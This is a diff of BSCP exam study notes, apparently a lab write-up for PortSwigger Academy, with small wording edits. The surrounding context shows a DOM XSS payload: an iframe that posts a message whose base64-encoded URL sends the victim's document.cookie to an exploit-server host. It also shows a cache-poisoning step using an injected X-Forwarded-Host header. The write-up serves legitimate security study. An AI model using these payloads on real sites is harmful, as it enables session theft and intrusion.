@@ -34,7 +34,7 @@ The acronym BSCP has nice simular ring like OSCP  :)
 
 >Target use web messaging and parses the message as JSON. Exploiting the vulnerability by constructing an HTML page on the exploit server that exploits DOM XSS vulnerability and steal victim cookie.  
 
->vulnerable JavaScript code on the target using event listener that listens for a web message. This event listener expects a **string** that is parsed using **JSON.parse()**. In the JavaScript below, we can see that the event listener expects a **type** property and that the **load-channel** case of the **switch** statement changes the **img src** attribute.  
+>The vulnerable JavaScript code on the target using event listener that listens for a web message. This event listener expects a **string** that is parsed using **JSON.parse()**. In the JavaScript below, we can see that the event listener expects a **type** property and that the **load-channel** case of the **switch** statement changes the **img src** attribute.  
 
 ```JavaScript
 <script>
@@ -76,7 +76,7 @@ http://exploit-0ac30095035c7526c09ebd7401a00075.exploit-server.net/bs.png/?bd=do
 >Hosted exploit server body.  
 
 ```html
-<iframe src=https://0ace001803c77527c0bdbe4c00050092.web-security-academy.net/ onload='this.contentWindow.postMessage(JSON.stringify({
+<iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage(JSON.stringify({
         type: "load-channel",
         url:  atob("aHR0cDovL2V4cGxvaXQtMGFjMzAwOTUwMzVjNzUyNmMwOWViZDc0MDFhMDAwNzUuZXhwbG9pdC1zZXJ2ZXIubmV0Lz9iZD1kb2N1bWVudC5jb29raWU=")
     }), "*");'>
@@ -100,7 +100,7 @@ X-Forwarded-Host: exploit-SERVER.exploit-server.net
 
 ![tracking.js](images/tracking.js.png)  
 
->Hosting the following **on exploit server, injecting the **X-Forwarded-Host** header in request, and poison the cache until victim hits poison cache.  
+>Hosting on the exploit server, injecting the **X-Forwarded-Host** header in request, and poison the cache until victim hits poison cache.  
 
 ```
  /resources/js/tracking.js 
